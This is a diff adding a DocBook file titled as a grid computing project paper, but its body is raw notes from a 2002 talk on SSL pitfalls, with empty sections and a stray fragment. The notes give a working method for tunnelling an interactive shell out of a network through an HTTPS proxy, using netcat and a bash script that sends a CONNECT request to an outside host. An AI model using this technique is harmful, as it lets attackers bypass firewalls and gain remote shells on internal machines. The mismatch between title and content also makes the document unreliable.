@@ -1,0 +1,100 @@
+<!DOCTYPE article PUBLIC "-//OASIS//DTD DocBook V4.1//EN">
+<article>
+<title>Grid computing and the open grid services architecture</title>
+   <subtitle>A final year project discussion paper (number two)</subtitle>
+
+<sect1>
+<title>About the author</title>
+<para>
+Michael's student number is 964076. He can be contacted at mikal@stillhq.com. Copyright (c) Michael Still 2002. This submission is
+<postexecute><cmd>striptext.pl</cmd><output>temp.txt</output><args>-c</args></postexecute>
+<postexecute><cmd>wc -w</cmd><input>temp.txt</input></postexecute>
+words, not including the code snippets.
+</para>
+</sect1>
+
+<sect1>
+<title>Abstract</title>
+<para>
+
+</para>
+</sect1>
+
+<sect1><title>The meeting</title>
+<para>
+Held at the AFP place
+16 July 2002, 2pm to 3pm
+</para>
+</sect1>
+
+Secure Sockets Layer: Pitfalls and Risks
+
+Steven McLeod
+Dr Michael Cohen
+
+Main issue is the trust mechanism
+ - Normal port is 443
+
+SSL was designed to solve two problems
+ - intercept of data
+ - proof of identity of the communicating parties
+
+Threats
+ - SSL is encrypted
+ - Man in the middle should not be able to view traffic
+  - Therefore no: firewalling, ids, virus scan, auditing
+
+Normally
+ - Client requests connect to server (CONNECT ... HTTP/1.1)
+ - Firewall builds a tunnel
+ - Client and server talk 
+
+Dangerous
+ - Run on outside machine: nc -l -p 443
+
+#!/bin/bash
+echo -e "CONNECT outside.machine.foo.com:443 HTTP/1.0\r\n\r\n"
+bash -i 2> /dev/null
+
+ - On inside machine: nc -e scriptfile.sh proxyhost 8080
+
+ - There are windows apps to do this too (HTTPort)
+
+WebDav
+ - Web Distributed Authoring and Versioning
+ - File management over HTTP
+ - Upload arbitary files
+ - Download arbitary files
+
+ - Well supported on Windows especially
+ - Most good web servers support it
+
+Certificates
+ - A digital statement collating a number of fields
+ - Company name, server name, email address, public key
+ - Signed by the certifying authority
+
+Therefore
+ - CA needs to perform identity checks
+ - Cert can't be changed
+ - Anyone can verify certificate
+ - The decision of trust in a browser is made about whether the browser trusts the CA
+
+Securing the server's private key
+ - Apache uses a pass phrase to encrypt the private key
+ - IIS doesn't bother!
+
+Attacks
+ - Man in the middle -- certificate stops this (or does it)
+
+APPLET vulnerability in MSIE
+
+http://www.dsd.gov.au/papers/AusCert2002.pdf
+                      talks     c
+
+<sect1><title>Response to the talk</title>
+<para>
+
+</para>
+</sect1>
+</article>
